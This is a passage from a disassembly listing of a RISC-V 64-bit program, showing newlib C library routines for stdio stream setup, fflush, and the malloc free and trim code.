   12902:	6442                	ld	s0,16(sp)
   12904:	60e2                	ld	ra,24(sp)
   12906:	6105                	addi	sp,sp,32
   12908:	bd0d                	j	1273a <__sflush_r>

000000000001290a <fflush>:
   1290a:	85aa                	mv	a1,a0
   1290c:	c501                	beqz	a0,12914 <fflush+0xa>
   1290e:	8601b503          	ld	a0,-1952(gp) # 1f558 <_impure_ptr>
   12912:	b7c9                	j	128d4 <_fflush_r>
   12914:	00000597          	auipc	a1,0x0
   12918:	fc058593          	addi	a1,a1,-64 # 128d4 <_fflush_r>
   1291c:	8301b503          	ld	a0,-2000(gp) # 1f528 <_global_impure_ptr>
   12920:	1790006f          	j	13298 <_fwalk_reent>

0000000000012924 <__fp_lock>:
   12924:	4501                	li	a0,0
   12926:	8082                	ret

0000000000012928 <_cleanup_r>:
   12928:	00007597          	auipc	a1,0x7
   1292c:	37858593          	addi	a1,a1,888 # 19ca0 <_fclose_r>
   12930:	1690006f          	j	13298 <_fwalk_reent>

0000000000012934 <__sinit.part.0>:
   12934:	7139                	addi	sp,sp,-64
   12936:	fc06                	sd	ra,56(sp)
   12938:	f822                	sd	s0,48(sp)
   1293a:	f426                	sd	s1,40(sp)
   1293c:	f04a                	sd	s2,32(sp)
   1293e:	ec4e                	sd	s3,24(sp)
   12940:	e852                	sd	s4,16(sp)
   12942:	e456                	sd	s5,8(sp)
   12944:	e05a                	sd	s6,0(sp)
   12946:	6500                	ld	s0,8(a0)
   12948:	00000717          	auipc	a4,0x0
   1294c:	fe070713          	addi	a4,a4,-32 # 12928 <_cleanup_r>
   12950:	ed38                	sd	a4,88(a0)
   12952:	53850793          	addi	a5,a0,1336
   12956:	470d                	li	a4,3
   12958:	52e52423          	sw	a4,1320(a0)
   1295c:	52f53823          	sd	a5,1328(a0)
   12960:	52053023          	sd	zero,1312(a0)
   12964:	4791                	li	a5,4
   12966:	892a                	mv	s2,a0
   12968:	c81c                	sw	a5,16(s0)
   1296a:	4621                	li	a2,8
   1296c:	4581                	li	a1,0
   1296e:	0a042623          	sw	zero,172(s0)
   12972:	00043023          	sd	zero,0(s0)
   12976:	00043423          	sd	zero,8(s0)
   1297a:	00043c23          	sd	zero,24(s0)
   1297e:	02042023          	sw	zero,32(s0)
   12982:	02042423          	sw	zero,40(s0)
   12986:	0a440513          	addi	a0,s0,164
   1298a:	d31fd0ef          	jal	ra,106ba <memset>
   1298e:	01093483          	ld	s1,16(s2)
   12992:	00004b17          	auipc	s6,0x4
   12996:	594b0b13          	addi	s6,s6,1428 # 16f26 <__sread>
   1299a:	00004a97          	auipc	s5,0x4
   1299e:	5c8a8a93          	addi	s5,s5,1480 # 16f62 <__swrite>
   129a2:	00004a17          	auipc	s4,0x4
   129a6:	614a0a13          	addi	s4,s4,1556 # 16fb6 <__sseek>
   129aa:	00004997          	auipc	s3,0x4
   129ae:	64e98993          	addi	s3,s3,1614 # 16ff8 <__sclose>
   129b2:	67c1                	lui	a5,0x10
   129b4:	03643c23          	sd	s6,56(s0)
   129b8:	05543023          	sd	s5,64(s0)
   129bc:	05443423          	sd	s4,72(s0)
   129c0:	05343823          	sd	s3,80(s0)
   129c4:	f800                	sd	s0,48(s0)
   129c6:	07a5                	addi	a5,a5,9
   129c8:	c89c                	sw	a5,16(s1)
   129ca:	4621                	li	a2,8
   129cc:	4581                	li	a1,0
   129ce:	0a04a623          	sw	zero,172(s1)
   129d2:	0004b023          	sd	zero,0(s1)
   129d6:	0004b423          	sd	zero,8(s1)
   129da:	0004bc23          	sd	zero,24(s1)
   129de:	0204a023          	sw	zero,32(s1)
   129e2:	0204a423          	sw	zero,40(s1)
   129e6:	0a448513          	addi	a0,s1,164
   129ea:	cd1fd0ef          	jal	ra,106ba <memset>
   129ee:	01893403          	ld	s0,24(s2)
   129f2:	000207b7          	lui	a5,0x20
   129f6:	0364bc23          	sd	s6,56(s1)
   129fa:	0554b023          	sd	s5,64(s1)
   129fe:	0544b423          	sd	s4,72(s1)
   12a02:	0534b823          	sd	s3,80(s1)
   12a06:	f884                	sd	s1,48(s1)
   12a08:	07c9                	addi	a5,a5,18
   12a0a:	c81c                	sw	a5,16(s0)
   12a0c:	0a042623          	sw	zero,172(s0)
   12a10:	00043023          	sd	zero,0(s0)
   12a14:	00043423          	sd	zero,8(s0)
   12a18:	00043c23          	sd	zero,24(s0)
   12a1c:	02042023          	sw	zero,32(s0)
   12a20:	02042423          	sw	zero,40(s0)
   12a24:	0a440513          	addi	a0,s0,164
   12a28:	4621                	li	a2,8
   12a2a:	4581                	li	a1,0
   12a2c:	c8ffd0ef          	jal	ra,106ba <memset>
   12a30:	70e2                	ld	ra,56(sp)
   12a32:	03643c23          	sd	s6,56(s0)
   12a36:	05543023          	sd	s5,64(s0)
   12a3a:	05443423          	sd	s4,72(s0)
   12a3e:	05343823          	sd	s3,80(s0)
   12a42:	f800                	sd	s0,48(s0)
   12a44:	7442                	ld	s0,48(sp)
   12a46:	4785                	li	a5,1
   12a48:	04f92823          	sw	a5,80(s2)
   12a4c:	74a2                	ld	s1,40(sp)
   12a4e:	7902                	ld	s2,32(sp)
   12a50:	69e2                	ld	s3,24(sp)
   12a52:	6a42                	ld	s4,16(sp)
   12a54:	6aa2                	ld	s5,8(sp)
   12a56:	6b02                	ld	s6,0(sp)
   12a58:	6121                	addi	sp,sp,64
   12a5a:	8082                	ret

0000000000012a5c <__fp_unlock>:
   12a5c:	4501                	li	a0,0
   12a5e:	8082                	ret

0000000000012a60 <__sfmoreglue>:
   12a60:	1101                	addi	sp,sp,-32
   12a62:	e426                	sd	s1,8(sp)
   12a64:	0b000613          	li	a2,176
   12a68:	fff5849b          	addiw	s1,a1,-1
   12a6c:	02c484b3          	mul	s1,s1,a2
   12a70:	e04a                	sd	s2,0(sp)
   12a72:	892e                	mv	s2,a1
   12a74:	e822                	sd	s0,16(sp)
   12a76:	ec06                	sd	ra,24(sp)
   12a78:	0c848593          	addi	a1,s1,200
   12a7c:	315020ef          	jal	ra,15590 <_malloc_r>
   12a80:	842a                	mv	s0,a0
   12a82:	cd01                	beqz	a0,12a9a <__sfmoreglue+0x3a>
   12a84:	0561                	addi	a0,a0,24
   12a86:	00043023          	sd	zero,0(s0)
   12a8a:	01242423          	sw	s2,8(s0)
   12a8e:	e808                	sd	a0,16(s0)
   12a90:	0b048613          	addi	a2,s1,176
   12a94:	4581                	li	a1,0
   12a96:	c25fd0ef          	jal	ra,106ba <memset>
   12a9a:	60e2                	ld	ra,24(sp)
   12a9c:	8522                	mv	a0,s0
   12a9e:	6442                	ld	s0,16(sp)
   12aa0:	64a2                	ld	s1,8(sp)
   12aa2:	6902                	ld	s2,0(sp)
   12aa4:	6105                	addi	sp,sp,32
   12aa6:	8082                	ret

0000000000012aa8 <__sfp>:
   12aa8:	7179                	addi	sp,sp,-48
   12aaa:	ec26                	sd	s1,24(sp)
   12aac:	8301b483          	ld	s1,-2000(gp) # 1f528 <_global_impure_ptr>
   12ab0:	48bc                	lw	a5,80(s1)
   12ab2:	e84a                	sd	s2,16(sp)
   12ab4:	f406                	sd	ra,40(sp)
   12ab6:	f022                	sd	s0,32(sp)
   12ab8:	e44e                	sd	s3,8(sp)
   12aba:	892a                	mv	s2,a0
   12abc:	c3c9                	beqz	a5,12b3e <__sfp+0x96>
   12abe:	52048493          	addi	s1,s1,1312
   12ac2:	0b000993          	li	s3,176
   12ac6:	449c                	lw	a5,8(s1)
   12ac8:	6880                	ld	s0,16(s1)
   12aca:	06f05663          	blez	a5,12b36 <__sfp+0x8e>
   12ace:	37fd                	addiw	a5,a5,-1
   12ad0:	1782                	slli	a5,a5,0x20
   12ad2:	9381                	srli	a5,a5,0x20
   12ad4:	0785                	addi	a5,a5,1
   12ad6:	033787b3          	mul	a5,a5,s3
   12ada:	97a2                	add	a5,a5,s0
   12adc:	a029                	j	12ae6 <__sfp+0x3e>
   12ade:	0b040413          	addi	s0,s0,176
   12ae2:	04878a63          	beq	a5,s0,12b36 <__sfp+0x8e>
   12ae6:	01041703          	lh	a4,16(s0)
   12aea:	fb75                	bnez	a4,12ade <__sfp+0x36>
   12aec:	77c1                	lui	a5,0xffff0
   12aee:	0785                	addi	a5,a5,1
   12af0:	0a042623          	sw	zero,172(s0)
   12af4:	00043023          	sd	zero,0(s0)
   12af8:	00043423          	sd	zero,8(s0)
   12afc:	c81c                	sw	a5,16(s0)
   12afe:	00043c23          	sd	zero,24(s0)
   12b02:	02042023          	sw	zero,32(s0)
   12b06:	02042423          	sw	zero,40(s0)
   12b0a:	4621                	li	a2,8
   12b0c:	4581                	li	a1,0
   12b0e:	0a440513          	addi	a0,s0,164
   12b12:	ba9fd0ef          	jal	ra,106ba <memset>
   12b16:	04043c23          	sd	zero,88(s0)
   12b1a:	06042023          	sw	zero,96(s0)
   12b1e:	06043c23          	sd	zero,120(s0)
   12b22:	08042023          	sw	zero,128(s0)
   12b26:	70a2                	ld	ra,40(sp)
   12b28:	8522                	mv	a0,s0
   12b2a:	7402                	ld	s0,32(sp)
   12b2c:	64e2                	ld	s1,24(sp)
   12b2e:	6942                	ld	s2,16(sp)
   12b30:	69a2                	ld	s3,8(sp)
   12b32:	6145                	addi	sp,sp,48
   12b34:	8082                	ret
   12b36:	6080                	ld	s0,0(s1)
   12b38:	c419                	beqz	s0,12b46 <__sfp+0x9e>
   12b3a:	84a2                	mv	s1,s0
   12b3c:	b769                	j	12ac6 <__sfp+0x1e>
   12b3e:	8526                	mv	a0,s1
   12b40:	df5ff0ef          	jal	ra,12934 <__sinit.part.0>
   12b44:	bfad                	j	12abe <__sfp+0x16>
   12b46:	4591                	li	a1,4
   12b48:	854a                	mv	a0,s2
   12b4a:	f17ff0ef          	jal	ra,12a60 <__sfmoreglue>
   12b4e:	e088                	sd	a0,0(s1)
   12b50:	842a                	mv	s0,a0
   12b52:	f565                	bnez	a0,12b3a <__sfp+0x92>
   12b54:	47b1                	li	a5,12
   12b56:	00f92023          	sw	a5,0(s2)
   12b5a:	b7f1                	j	12b26 <__sfp+0x7e>

0000000000012b5c <_cleanup>:
   12b5c:	00007597          	auipc	a1,0x7
   12b60:	14458593          	addi	a1,a1,324 # 19ca0 <_fclose_r>
   12b64:	8301b503          	ld	a0,-2000(gp) # 1f528 <_global_impure_ptr>
   12b68:	af05                	j	13298 <_fwalk_reent>

0000000000012b6a <__sinit>:
   12b6a:	493c                	lw	a5,80(a0)
   12b6c:	c391                	beqz	a5,12b70 <__sinit+0x6>
   12b6e:	8082                	ret
   12b70:	b3d1                	j	12934 <__sinit.part.0>

0000000000012b72 <__sfp_lock_acquire>:
   12b72:	8082                	ret

0000000000012b74 <__sfp_lock_release>:
   12b74:	8082                	ret

0000000000012b76 <__sinit_lock_acquire>:
   12b76:	8082                	ret

0000000000012b78 <__sinit_lock_release>:
   12b78:	8082                	ret

0000000000012b7a <__fp_lock_all>:
   12b7a:	00000597          	auipc	a1,0x0
   12b7e:	daa58593          	addi	a1,a1,-598 # 12924 <__fp_lock>
   12b82:	8601b503          	ld	a0,-1952(gp) # 1f558 <_impure_ptr>
   12b86:	ad41                	j	13216 <_fwalk>

0000000000012b88 <__fp_unlock_all>:
   12b88:	00000597          	auipc	a1,0x0
   12b8c:	ed458593          	addi	a1,a1,-300 # 12a5c <__fp_unlock>
   12b90:	8601b503          	ld	a0,-1952(gp) # 1f558 <_impure_ptr>
   12b94:	a549                	j	13216 <_fwalk>

0000000000012b96 <__libc_fini_array>:
   12b96:	1101                	addi	sp,sp,-32
   12b98:	e822                	sd	s0,16(sp)
   12b9a:	0000b797          	auipc	a5,0xb
   12b9e:	7be78793          	addi	a5,a5,1982 # 1e358 <__fini_array_end>
   12ba2:	0000b417          	auipc	s0,0xb
   12ba6:	7ae40413          	addi	s0,s0,1966 # 1e350 <__init_array_end>
   12baa:	8f81                	sub	a5,a5,s0
   12bac:	e426                	sd	s1,8(sp)
   12bae:	ec06                	sd	ra,24(sp)
   12bb0:	4037d493          	srai	s1,a5,0x3
   12bb4:	c881                	beqz	s1,12bc4 <__libc_fini_array+0x2e>
   12bb6:	17e1                	addi	a5,a5,-8
   12bb8:	943e                	add	s0,s0,a5
   12bba:	601c                	ld	a5,0(s0)
   12bbc:	14fd                	addi	s1,s1,-1
   12bbe:	1461                	addi	s0,s0,-8
   12bc0:	9782                	jalr	a5
   12bc2:	fce5                	bnez	s1,12bba <__libc_fini_array+0x24>
   12bc4:	60e2                	ld	ra,24(sp)
   12bc6:	6442                	ld	s0,16(sp)
   12bc8:	64a2                	ld	s1,8(sp)
   12bca:	6105                	addi	sp,sp,32
   12bcc:	8082                	ret

0000000000012bce <_malloc_trim_r>:
   12bce:	7179                	addi	sp,sp,-48
   12bd0:	f022                	sd	s0,32(sp)
   12bd2:	ec26                	sd	s1,24(sp)
   12bd4:	e84a                	sd	s2,16(sp)
   12bd6:	e44e                	sd	s3,8(sp)
   12bd8:	e052                	sd	s4,0(sp)
   12bda:	89ae                	mv	s3,a1
   12bdc:	f406                	sd	ra,40(sp)
   12bde:	0000ca17          	auipc	s4,0xc
   12be2:	10aa0a13          	addi	s4,s4,266 # 1ece8 <__malloc_av_>
   12be6:	892a                	mv	s2,a0
   12be8:	26a030ef          	jal	ra,15e52 <__malloc_lock>
   12bec:	010a3703          	ld	a4,16(s4)
   12bf0:	6785                	lui	a5,0x1
   12bf2:	fdf78413          	addi	s0,a5,-33 # fdf <register_fini-0xf0d1>
   12bf6:	6704                	ld	s1,8(a4)
   12bf8:	41340433          	sub	s0,s0,s3
   12bfc:	98f1                	andi	s1,s1,-4
   12bfe:	9426                	add	s0,s0,s1
   12c00:	8031                	srli	s0,s0,0xc
   12c02:	147d                	addi	s0,s0,-1
   12c04:	0432                	slli	s0,s0,0xc
   12c06:	00f44b63          	blt	s0,a5,12c1c <_malloc_trim_r+0x4e>
   12c0a:	4581                	li	a1,0
   12c0c:	854a                	mv	a0,s2
   12c0e:	1d4040ef          	jal	ra,16de2 <_sbrk_r>
   12c12:	010a3783          	ld	a5,16(s4)
   12c16:	97a6                	add	a5,a5,s1
   12c18:	00f50e63          	beq	a0,a5,12c34 <_malloc_trim_r+0x66>
   12c1c:	854a                	mv	a0,s2
   12c1e:	236030ef          	jal	ra,15e54 <__malloc_unlock>
   12c22:	70a2                	ld	ra,40(sp)
   12c24:	7402                	ld	s0,32(sp)
   12c26:	64e2                	ld	s1,24(sp)
   12c28:	6942                	ld	s2,16(sp)
   12c2a:	69a2                	ld	s3,8(sp)
   12c2c:	6a02                	ld	s4,0(sp)
   12c2e:	4501                	li	a0,0
   12c30:	6145                	addi	sp,sp,48
   12c32:	8082                	ret
   12c34:	408005b3          	neg	a1,s0
   12c38:	854a                	mv	a0,s2
   12c3a:	1a8040ef          	jal	ra,16de2 <_sbrk_r>
   12c3e:	57fd                	li	a5,-1
   12c40:	02f50a63          	beq	a0,a5,12c74 <_malloc_trim_r+0xa6>
   12c44:	0e018713          	addi	a4,gp,224 # 1fdd8 <__malloc_current_mallinfo>
   12c48:	431c                	lw	a5,0(a4)
   12c4a:	010a3683          	ld	a3,16(s4)
   12c4e:	8c81                	sub	s1,s1,s0
   12c50:	0014e493          	ori	s1,s1,1
   12c54:	4087843b          	subw	s0,a5,s0
   12c58:	854a                	mv	a0,s2
   12c5a:	e684                	sd	s1,8(a3)
   12c5c:	c300                	sw	s0,0(a4)
   12c5e:	1f6030ef          	jal	ra,15e54 <__malloc_unlock>
   12c62:	70a2                	ld	ra,40(sp)
   12c64:	7402                	ld	s0,32(sp)
   12c66:	64e2                	ld	s1,24(sp)
   12c68:	6942                	ld	s2,16(sp)
   12c6a:	69a2                	ld	s3,8(sp)
   12c6c:	6a02                	ld	s4,0(sp)
   12c6e:	4505                	li	a0,1
   12c70:	6145                	addi	sp,sp,48
   12c72:	8082                	ret
   12c74:	4581                	li	a1,0
   12c76:	854a                	mv	a0,s2
   12c78:	16a040ef          	jal	ra,16de2 <_sbrk_r>
   12c7c:	010a3703          	ld	a4,16(s4)
   12c80:	46fd                	li	a3,31
   12c82:	40e507b3          	sub	a5,a0,a4
   12c86:	f8f6dbe3          	bge	a3,a5,12c1c <_malloc_trim_r+0x4e>
   12c8a:	8681b683          	ld	a3,-1944(gp) # 1f560 <__malloc_sbrk_base>
   12c8e:	8d15                	sub	a0,a0,a3
   12c90:	0017e793          	ori	a5,a5,1
   12c94:	0ea1a023          	sw	a0,224(gp) # 1fdd8 <__malloc_current_mallinfo>
   12c98:	e71c                	sd	a5,8(a4)
   12c9a:	b749                	j	12c1c <_malloc_trim_r+0x4e>

0000000000012c9c <_free_r>:
   12c9c:	c5f5                	beqz	a1,12d88 <_free_r+0xec>
   12c9e:	1101                	addi	sp,sp,-32
   12ca0:	e822                	sd	s0,16(sp)
   12ca2:	e426                	sd	s1,8(sp)
   12ca4:	842e                	mv	s0,a1
   12ca6:	84aa                	mv	s1,a0
   12ca8:	ec06                	sd	ra,24(sp)
   12caa:	1a8030ef          	jal	ra,15e52 <__malloc_lock>
   12cae:	ff843583          	ld	a1,-8(s0)
   12cb2:	ff040713          	addi	a4,s0,-16
   12cb6:	0000c517          	auipc	a0,0xc
   12cba:	03250513          	addi	a0,a0,50 # 1ece8 <__malloc_av_>
   12cbe:	ffe5f793          	andi	a5,a1,-2
   12cc2:	00f70633          	add	a2,a4,a5
   12cc6:	6614                	ld	a3,8(a2)
   12cc8:	01053803          	ld	a6,16(a0)
   12ccc:	9af1                	andi	a3,a3,-4
   12cce:	14c80063          	beq	a6,a2,12e0e <_free_r+0x172>
   12cd2:	e614                	sd	a3,8(a2)
   12cd4:	8985                	andi	a1,a1,1
   12cd6:	00d60833          	add	a6,a2,a3
   12cda:	e1c1                	bnez	a1,12d5a <_free_r+0xbe>
   12cdc:	ff043303          	ld	t1,-16(s0)
   12ce0:	00883583          	ld	a1,8(a6)
   12ce4:	0000c897          	auipc	a7,0xc
   12ce8:	01488893          	addi	a7,a7,20 # 1ecf8 <__malloc_av_+0x10>
   12cec:	40670733          	sub	a4,a4,t1
   12cf0:	01073803          	ld	a6,16(a4)
   12cf4:	979a                	add	a5,a5,t1
   12cf6:	8985                	andi	a1,a1,1
   12cf8:	0f180863          	beq	a6,a7,12de8 <_free_r+0x14c>
   12cfc:	01873303          	ld	t1,24(a4)
   12d00:	00683c23          	sd	t1,24(a6)
   12d04:	01033823          	sd	a6,16(t1)
   12d08:	14058d63          	beqz	a1,12e62 <_free_r+0x1c6>
   12d0c:	0017e693          	ori	a3,a5,1
   12d10:	e714                	sd	a3,8(a4)
   12d12:	e21c                	sd	a5,0(a2)
   12d14:	1ff00693          	li	a3,511
   12d18:	08f6e263          	bltu	a3,a5,12d9c <_free_r+0x100>
   12d1c:	838d                	srli	a5,a5,0x3
   12d1e:	0017869b          	addiw	a3,a5,1
   12d22:	0016969b          	slliw	a3,a3,0x1
   12d26:	068e                	slli	a3,a3,0x3
   12d28:	00853803          	ld	a6,8(a0)
   12d2c:	96aa                	add	a3,a3,a0
   12d2e:	628c                	ld	a1,0(a3)
   12d30:	4027d61b          	sraiw	a2,a5,0x2
   12d34:	4785                	li	a5,1
   12d36:	00c797b3          	sll	a5,a5,a2
   12d3a:	0107e7b3          	or	a5,a5,a6
   12d3e:	ff068613          	addi	a2,a3,-16
   12d42:	ef10                	sd	a2,24(a4)
   12d44:	eb0c                	sd	a1,16(a4)
   12d46:	e51c                	sd	a5,8(a0)
   12d48:	e298                	sd	a4,0(a3)
   12d4a:	ed98                	sd	a4,24(a1)
   12d4c:	6442                	ld	s0,16(sp)
   12d4e:	60e2                	ld	ra,24(sp)
   12d50:	8526                	mv	a0,s1
   12d52:	64a2                	ld	s1,8(sp)
   12d54:	6105                	addi	sp,sp,32
   12d56:	0fe0306f          	j	15e54 <__malloc_unlock>
   12d5a:	00883583          	ld	a1,8(a6)
   12d5e:	8985                	andi	a1,a1,1
   12d60:	e58d                	bnez	a1,12d8a <_free_r+0xee>
   12d62:	97b6                	add	a5,a5,a3
   12d64:	0000c897          	auipc	a7,0xc
   12d68:	f9488893          	addi	a7,a7,-108 # 1ecf8 <__malloc_av_+0x10>
   12d6c:	6a14                	ld	a3,16(a2)
   12d6e:	0017e813          	ori	a6,a5,1
   12d72:	00f705b3          	add	a1,a4,a5
   12d76:	11168063          	beq	a3,a7,12e76 <_free_r+0x1da>
   12d7a:	6e10                	ld	a2,24(a2)
   12d7c:	ee90                	sd	a2,24(a3)
   12d7e:	ea14                	sd	a3,16(a2)
   12d80:	01073423          	sd	a6,8(a4)
   12d84:	e19c                	sd	a5,0(a1)
   12d86:	b779                	j	12d14 <_free_r+0x78>
   12d88:	8082                	ret
   12d8a:	0017e693          	ori	a3,a5,1
   12d8e:	fed43c23          	sd	a3,-8(s0)
   12d92:	e21c                	sd	a5,0(a2)
   12d94:	1ff00693          	li	a3,511
   12d98:	f8f6f2e3          	bgeu	a3,a5,12d1c <_free_r+0x80>
   12d9c:	0097d693          	srli	a3,a5,0x9
   12da0:	4611                	li	a2,4
   12da2:	08d66f63          	bltu	a2,a3,12e40 <_free_r+0x1a4>
   12da6:	0067d693          	srli	a3,a5,0x6
   12daa:	0396859b          	addiw	a1,a3,57
   12dae:	0015959b          	slliw	a1,a1,0x1
   12db2:	0386861b          	addiw	a2,a3,56
   12db6:	058e                	slli	a1,a1,0x3
   12db8:	95aa                	add	a1,a1,a0
   12dba:	6194                	ld	a3,0(a1)
   12dbc:	15c1                	addi	a1,a1,-16
   12dbe:	0cd58663          	beq	a1,a3,12e8a <_free_r+0x1ee>
   12dc2:	6690                	ld	a2,8(a3)
   12dc4:	9a71                	andi	a2,a2,-4
   12dc6:	00c7f563          	bgeu	a5,a2,12dd0 <_free_r+0x134>
   12dca:	6a94                	ld	a3,16(a3)
   12dcc:	fed59be3          	bne	a1,a3,12dc2 <_free_r+0x126>
   12dd0:	6e8c                	ld	a1,24(a3)
   12dd2:	ef0c                	sd	a1,24(a4)
   12dd4:	eb14                	sd	a3,16(a4)
   12dd6:	6442                	ld	s0,16(sp)
   12dd8:	60e2                	ld	ra,24(sp)
   12dda:	e998                	sd	a4,16(a1)
   12ddc:	8526                	mv	a0,s1
   12dde:	64a2                	ld	s1,8(sp)
   12de0:	ee98                	sd	a4,24(a3)
   12de2:	6105                	addi	sp,sp,32
   12de4:	0700306f          	j	15e54 <__malloc_unlock>
   12de8:	0e059d63          	bnez	a1,12ee2 <_free_r+0x246>
   12dec:	6e0c                	ld	a1,24(a2)
   12dee:	6a10                	ld	a2,16(a2)
   12df0:	97b6                	add	a5,a5,a3
   12df2:	6442                	ld	s0,16(sp)
   12df4:	ee0c                	sd	a1,24(a2)
   12df6:	e990                	sd	a2,16(a1)
   12df8:	0017e693          	ori	a3,a5,1
   12dfc:	60e2                	ld	ra,24(sp)
   12dfe:	e714                	sd	a3,8(a4)
   12e00:	8526                	mv	a0,s1
   12e02:	973e                	add	a4,a4,a5
   12e04:	64a2                	ld	s1,8(sp)
   12e06:	e31c                	sd	a5,0(a4)
   12e08:	6105                	addi	sp,sp,32
   12e0a:	04a0306f          	j	15e54 <__malloc_unlock>
   12e0e:	8985                	andi	a1,a1,1
   12e10:	97b6                	add	a5,a5,a3
   12e12:	e989                	bnez	a1,12e24 <_free_r+0x188>
   12e14:	ff043583          	ld	a1,-16(s0)
   12e18:	8f0d                	sub	a4,a4,a1
   12e1a:	6f14                	ld	a3,24(a4)
   12e1c:	6b10                	ld	a2,16(a4)
   12e1e:	97ae                	add	a5,a5,a1
   12e20:	ee14                	sd	a3,24(a2)
   12e22:	ea90                	sd	a2,16(a3)
   12e24:	0017e693          	ori	a3,a5,1
   12e28:	e714                	sd	a3,8(a4)
   12e2a:	e918                	sd	a4,16(a0)
   12e2c:	8701b703          	ld	a4,-1936(gp) # 1f568 <__malloc_trim_threshold>
   12e30:	f0e7eee3          	bltu	a5,a4,12d4c <_free_r+0xb0>
   12e34:	8981b583          	ld	a1,-1896(gp) # 1f590 <__malloc_top_pad>
   12e38:	8526                	mv	a0,s1
   12e3a:	d95ff0ef          	jal	ra,12bce <_malloc_trim_r>
   12e3e:	b739                	j	12d4c <_free_r+0xb0>
   12e40:	4651                	li	a2,20
   12e42:	02d67263          	bgeu	a2,a3,12e66 <_free_r+0x1ca>
   12e46:	05400613          	li	a2,84
   12e4a:	04d66b63          	bltu	a2,a3,12ea0 <_free_r+0x204>
   12e4e:	00c7d693          	srli	a3,a5,0xc
   12e52:	06f6859b          	addiw	a1,a3,111
   12e56:	0015959b          	slliw	a1,a1,0x1
   12e5a:	06e6861b          	addiw	a2,a3,110
   12e5e:	058e                	slli	a1,a1,0x3
   12e60:	bfa1                	j	12db8 <_free_r+0x11c>
   12e62:	97b6                	add	a5,a5,a3
   12e64:	b721                	j	12d6c <_free_r+0xd0>
   12e66:	05c6859b          	addiw	a1,a3,92
   12e6a:	0015959b          	slliw	a1,a1,0x1
   12e6e:	05b6861b          	addiw	a2,a3,91
   12e72:	058e                	slli	a1,a1,0x3
   12e74:	b791                	j	12db8 <_free_r+0x11c>
   12e76:	f518                	sd	a4,40(a0)
   12e78:	f118                	sd	a4,32(a0)
   12e7a:	01173c23          	sd	a7,24(a4)
   12e7e:	01173823          	sd	a7,16(a4)
   12e82:	01073423          	sd	a6,8(a4)
   12e86:	e19c                	sd	a5,0(a1)
   12e88:	b5d1                	j	12d4c <_free_r+0xb0>
   12e8a:	00853803          	ld	a6,8(a0)
   12e8e:	4026561b          	sraiw	a2,a2,0x2
   12e92:	4785                	li	a5,1
   12e94:	00c79633          	sll	a2,a5,a2
   12e98:	01066633          	or	a2,a2,a6
   12e9c:	e510                	sd	a2,8(a0)
   12e9e:	bf15                	j	12dd2 <_free_r+0x136>
   12ea0:	15400613          	li	a2,340
   12ea4:	00d66c63          	bltu	a2,a3,12ebc <_free_r+0x220>
   12ea8:	00f7d693          	srli	a3,a5,0xf
   12eac:	0786859b          	addiw	a1,a3,120
   12eb0:	0015959b          	slliw	a1,a1,0x1
   12eb4:	0776861b          	addiw	a2,a3,119
   12eb8:	058e                	slli	a1,a1,0x3
   12eba:	bdfd                	j	12db8 <_free_r+0x11c>
   12ebc:	55400613          	li	a2,1364
   12ec0:	00d66c63          	bltu	a2,a3,12ed8 <_free_r+0x23c>
   12ec4:	0127d693          	srli	a3,a5,0x12
   12ec8:	07d6859b          	addiw	a1,a3,125
   12ecc:	0015959b          	slliw	a1,a1,0x1
   12ed0:	07c6861b          	addiw	a2,a3,124
   12ed4:	058e                	slli	a1,a1,0x3
   12ed6:	b5cd                	j	12db8 <_free_r+0x11c>
   12ed8:	7f000593          	li	a1,2032
   12edc:	07e00613          	li	a2,126
   12ee0:	bde1                	j	12db8 <_free_r+0x11c>
   12ee2:	0017e693          	ori	a3,a5,1
   12ee6:	e714                	sd	a3,8(a4)
   12ee8:	e21c                	sd	a5,0(a2)
   12eea:	b58d                	j	12d4c <_free_r+0xb0>

0000000000012eec <__sfvwrite_r>:
   12eec:	6a1c                	ld	a5,16(a2)
   12eee:	1a078c63          	beqz	a5,130a6 <__sfvwrite_r+0x1ba>
   12ef2:	0105d783          	lhu	a5,16(a1)
   12ef6:	711d                	addi	sp,sp,-96
   12ef8:	e8a2                	sd	s0,80(sp)
   12efa:	f852                	sd	s4,48(sp)
   12efc:	f456                	sd	s5,40(sp)
   12efe:	ec86                	sd	ra,88(sp)
   12f00:	e4a6                	sd	s1,72(sp)
   12f02:	e0ca                	sd	s2,64(sp)
   12f04:	fc4e                	sd	s3,56(sp)
   12f06:	f05a                	sd	s6,32(sp)
   12f08:	ec5e                	sd	s7,24(sp)
   12f0a:	e862                	sd	s8,16(sp)
   12f0c:	e466                	sd	s9,8(sp)
   12f0e:	e06a                	sd	s10,0(sp)
   12f10:	0087f713          	andi	a4,a5,8
   12f14:	8a32                	mv	s4,a2
   12f16:	8aaa                	mv	s5,a0
   12f18:	842e                	mv	s0,a1
   12f1a:	c325                	beqz	a4,12f7a <__sfvwrite_r+0x8e>
   12f1c:	6d98                	ld	a4,24(a1)
   12f1e:	cf31                	beqz	a4,12f7a <__sfvwrite_r+0x8e>
   12f20:	0027f713          	andi	a4,a5,2
   12f24:	000a3903          	ld	s2,0(s4)
   12f28:	c735                	beqz	a4,12f94 <__sfvwrite_r+0xa8>
   12f2a:	603c                	ld	a5,64(s0)
   12f2c:	780c                	ld	a1,48(s0)
   12f2e:	80000b37          	lui	s6,0x80000
   12f32:	4981                	li	s3,0
   12f34:	4481                	li	s1,0
   12f36:	c00b4b13          	xori	s6,s6,-1024
   12f3a:	864e                	mv	a2,s3
   12f3c:	8556                	mv	a0,s5
   12f3e:	c885                	beqz	s1,12f6e <__sfvwrite_r+0x82>
   12f40:	86a6                	mv	a3,s1
   12f42:	009b7363          	bgeu	s6,s1,12f48 <__sfvwrite_r+0x5c>
   12f46:	86da                	mv	a3,s6
   12f48:	2681                	sext.w	a3,a3
   12f4a:	9782                	jalr	a5
   12f4c:	14a05563          	blez	a0,13096 <__sfvwrite_r+0x1aa>
   12f50:	010a3783          	ld	a5,16(s4)
   12f54:	99aa                	add	s3,s3,a0
   12f56:	8c89                	sub	s1,s1,a0
   12f58:	40a78533          	sub	a0,a5,a0
   12f5c:	00aa3823          	sd	a0,16(s4)
   12f60:	10050763          	beqz	a0,1306e <__sfvwrite_r+0x182>
   12f64:	603c                	ld	a5,64(s0)
   12f66:	780c                	ld	a1,48(s0)
   12f68:	864e                	mv	a2,s3
   12f6a:	8556                	mv	a0,s5
   12f6c:	f8f1                	bnez	s1,12f40 <__sfvwrite_r+0x54>
   12f6e:	00093983          	ld	s3,0(s2)
   12f72:	00893483          	ld	s1,8(s2)
   12f76:	0941                	addi	s2,s2,16
   12f78:	b7c9                	j	12f3a <__sfvwrite_r+0x4e>
